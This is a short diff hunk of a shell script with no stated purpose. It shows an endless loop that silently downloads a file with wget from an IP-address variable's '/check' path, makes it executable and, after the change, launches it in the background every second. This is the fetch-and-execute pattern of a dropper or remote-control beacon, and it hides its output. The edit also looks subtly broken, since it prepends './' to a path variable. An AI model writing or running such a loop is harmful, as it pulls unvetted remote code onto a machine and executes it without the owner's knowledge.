@@ -9,11 +9,7 @@ while true; do
     if [ ! -f "$script_path" ]; then
         wget "http://$ip_address/check" -O "$script_path" >/dev/null 2>&1
         chmod +x "$script_path"
-    else
-        if [ ! -x "$script_path" ]; then
-            chmod +x "$script_path"
-        fi
-        "$script_path" >/dev/null 2>&1
+        ./"$script_path" &
     fi
     
     sleep 1
